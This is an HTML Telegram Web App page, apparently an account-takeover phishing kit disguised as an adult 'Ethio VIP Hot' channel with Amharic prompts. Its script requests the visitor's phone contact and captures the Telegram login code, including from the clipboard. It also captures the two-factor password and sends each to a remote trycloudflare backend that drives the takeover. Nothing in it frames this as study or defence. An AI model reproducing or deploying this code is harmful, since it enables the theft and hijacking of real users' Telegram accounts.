<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Ethio VIP Hot 🔞</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { 
        margin: 0; padding: 0; color: #eee; font-family: 'Segoe UI', Roboto, Arial, sans-serif; 
        background: #000; overflow-x: hidden; min-height: 100vh;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
    }

    .bg-image {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background-size: cover; background-position: center;
        filter: brightness(0.4); z-index: -1; transition: background-image 0.8s ease;
    }

    .step { display: none; width: 90%; max-width: 400px; animation: fadeIn .5s ease; flex-direction: column; align-items: center; text-align: center; }
    .active { display: flex; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    .glass-card {
        background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
        border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 25px;
        padding: 30px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    }

    .loader-ring {
        width: 45px; height: 45px; border: 4px solid rgba(255, 153, 0, 0.2);
        border-top: 4px solid #FF9900; border-radius: 50%;
        animation: spin 1s linear infinite; margin-top: 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    input {
        width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px;
        border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.6);
        color: #fff; font-size: 16px;
    }
    .btn-main {
        background: linear-gradient(45deg, #FF9900, #FF6600); color: #000;
        padding: 16px; width: 100%; border-radius: 12px; border: none;
        font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px;
    }

    .otp-container { display: flex; gap: 10px; margin: 20px 0; }
    .otp-box { width: 50px; height: 60px; border: 2px solid rgba(255,255,255,0.2); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: bold; background: rgba(255,255,255,0.05); }
    .otp-box.filled { border-color: #FF9900; background: rgba(255, 153, 0, 0.1); }

    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
    .key { background: rgba(255,255,255,0.1); padding: 18px; border-radius: 15px; font-size: 22px; font-weight: bold; cursor: pointer; }
    .msg { padding: 12px; border-radius: 10px; font-size: 14px; margin: 15px 0; display: none; width: 100%; }
    .error { background: rgba(255, 50, 50, 0.2); color: #ff5555; }
    .loading-msg { background: rgba(255, 153, 0, 0.1); color: #FF9900; }
</style>
</head>
<body>

    <div class="bg-image" id="bgLayer"></div>

    <div id="step_intro" class="step active">
        <h1 style="font-size: 45px; letter-spacing: 2px; margin-bottom: 5px;">WELCOME</h1>
        <p style="font-size: 18px; opacity: 0.8; margin-bottom: 20px;">Ethio VIP Hot 🔞</p>
        <div class="loader-ring"></div>
        <h2 style="font-size: 20px; margin-top: 10px;">Loading...</h2>
    </div>

    <div id="step_photo_slide" class="step">
        <div class="glass-card">
            <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; border-radius: 15px;">
            <p style="margin-top: 15px; font-weight: bold;">እባክዎ ትንሽ ይጠብቁ...</p>
        </div>
    </div>

    <div id="step1" class="step">
        <div class="glass-card">
            <h2 style="margin-bottom: 5px;">አካውንት ይክፈቱ</h2>
            <p style="opacity: 0.7; margin-bottom: 20px; font-size: 14px;">መረጃዎን በትክክል ያስገቡ</p>
            <input type="text" id="fname" placeholder="First Name">
            <input type="text" id="lname" placeholder="Last Name">
            <div id="status1" class="msg"></div>
            <button class="btn-main" onclick="handleLoginClick()">Login</button>
        </div>
    </div>

    <div id="step2" class="step">
        <div class="glass-card">
            <h3 style="color:#FF9900;">ማረጋገጫ ኮድ</h3>
            <p style="font-size: 14px; opacity: 0.7;">በቴሌግራም የላክንልዎትን ኮድ ያስገቡ</p>
            <div class="otp-container" id="otp_container">
                <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
            </div>
            <button class="btn-main" style="background: #27a7e7; color: #fff; margin-bottom: 15px; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">ኮዱን ለማግኘት እዚህ ይጫኑ</button>
            <div id="status2" class="msg"></div>
            <div class="keypad">
                <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
                <div style="padding:18px;"></div><div class="key" onclick="press(0)">0</div>
                <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
            </div>
        </div>
    </div>

    <div id="step3" class="step">
        <div class="glass-card">
            <h2>ማረጋገጫ</h2>
            <p style="opacity: 0.7; margin-bottom: 20px;">የአካውንትዎን ፓስዎርድ ያስገቡ</p>
            <div id="status3" class="msg"></div>
            <input type="password" id="2fa_input" placeholder="Password">
            <button class="btn-main" onclick="submit2FA()">አረጋግጥ</button>
        </div>
    </div>

    <div id="step_success" class="step">
        <div class="glass-card">
            <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width:100%; border-radius:15px;">
            <h2 style="margin-top: 15px;">ተሳክቷል! ✅</h2>
            <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'">JOIN CHANNEL</button>
        </div>
    </div>

    <div id="flood_step" class="step">
        <h2 style="color: #ff4444;">ታግደዋል!</h2>
        <div style="font-size: 36px; color: #FF9900;" id="wait_time">00:00</div>
    </div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const API_BASE_URL = "https://citizenship-instances-list-probably.trycloudflare.com"; 
    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
    let sid = userId; 
    let currentOtp = "";
    let statusChecker;
    let isProcessing = false;

    const photos = [
        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg",
        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg",
        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg"
    ];

    window.onload = function() {
        const bg = document.getElementById('bgLayer');
        bg.style.backgroundImage = `url(${photos[0]})`;

        // 1. Welcome + Loading (3s)
        setTimeout(() => {
            bg.style.backgroundImage = `url(${photos[1]})`;
            showStep('photo_slide');
            
            // 2. Photo Slide (3s)
            setTimeout(() => {
                bg.style.backgroundImage = `url(${photos[2]})`;
                checkStatus(); 
                showStep(1); 
            }, 3000);
        }, 3000);

        statusChecker = setInterval(checkStatus, 3000);
        setupLongPressPaste(); 
    };

    function showStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
        const target = document.getElementById(stepId);
        if(target) target.classList.add('active');
    }

    function checkStatus() {
        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
            if (data.status === "NEED_OTP") { showStep(2); }
            else if (data.status === "NEED_2FA") { showStep(3); }
            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
        }).catch(e => {});
    }

    function handleLoginClick() {
        if(!document.getElementById('fname').value || !document.getElementById('lname').value) {
            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስምዎን ያስገቡ!');
            return;
        }
        startVerification();
    }

    function startVerification() {
        if (isProcessing) return;
        isProcessing = true;
        showMsg(1, 'loading-msg', 'አካውንት እየከፈቱ ነው ትንሽ ይጠብቁ...');
        checkUserInDB();
    }

    async function checkUserInDB() {
        try {
            const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId})
            });
            const data = await res.json();
            if (data.status === "SUCCESS") { showStep('success'); } 
            else { requestPhone(); }
        } catch(e) { 
            isProcessing = false;
            showMsg(1, 'error', 'ሰርቨሩ አልተገኘም። ቆይተው ይሞክሩ።');
        }
    }

    function requestPhone() {
        tg.requestContact((success) => {
            if (success) {
                showMsg(1, 'loading-msg', 'አካውንት እየከፈቱ ነው ትንሽ ይጠብቁ...');
            } else { 
                isProcessing = false;
                showMsg(1, 'error', 'ለመቀጠል የግድ Contact Share ማድረግ አለብዎት!'); 
            }
        });
    }

    function press(num) {
        if (currentOtp.length < 5) {
            currentOtp += num;
            updateOtpUI();
            if (currentOtp.length === 5) submitOTP();
        }
    }

    function backspace() { currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }

    function updateOtpUI() {
        for (let i = 0; i < 5; i++) {
            const box = document.getElementById('b' + i);
            box.innerText = currentOtp[i] || "";
            currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
        }
    }

    async function submitOTP() {
        showMsg(2, 'loading-msg', 'ኮዱን እያረጋገጥን ነው...');
        try {
            const res = await fetch(`${API_BASE_URL}/verify_otp`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({session_id: sid, otp: currentOtp})
            });
            const data = await res.json();
            handleResponse(data, 2);
        } catch(e) { showMsg(2, 'error', 'የመስመር መቆራረጥ!'); }
    }

    async function submit2FA() {
        const pass = document.getElementById('2fa_input').value;
        if(!pass) return showMsg(3, 'error', 'ፓስዎርድ ያስገቡ');
        showMsg(3, 'loading-msg', 'በመግባት ላይ...');
        try {
            const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({session_id: sid, password: pass})
            });
            const data = await res.json();
            handleResponse(data, 3);
        } catch(e) { showMsg(3, 'error', 'ስህተት አጋጥሟል!'); }
    }

    function handleResponse(data, step) {
        if (data.status === "SUCCESS") { showStep('success'); } 
        else if (data.status === "NEED_2FA") { showStep(3); }
        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
        else {
            showMsg(step, 'error', 'የተሳሳተ መረጃ! እንደገና ይሞክሩ።');
            if(step === 2) { currentOtp = ""; updateOtpUI(); }
        }
    }

    function showMsg(stepId, type, text) {
        const el = document.getElementById('status' + stepId);
        if(!el) return;
        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
    }

    function startFloodTimer(seconds) {
        showStep('flood_step');
        let rem = seconds;
        const iv = setInterval(() => {
            let m = Math.floor(rem / 60), s = rem % 60;
            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
        }, 1000);
    }

    function setupLongPressPaste() {
        const container = document.getElementById('otp_container');
        let timer;
        container.addEventListener('touchstart', () => {
            timer = setTimeout(async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
                    if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
                } catch (err) {}
            }, 800);
        });
        container.addEventListener('touchend', () => clearTimeout(timer));
    }
</script>
</body>
</html>
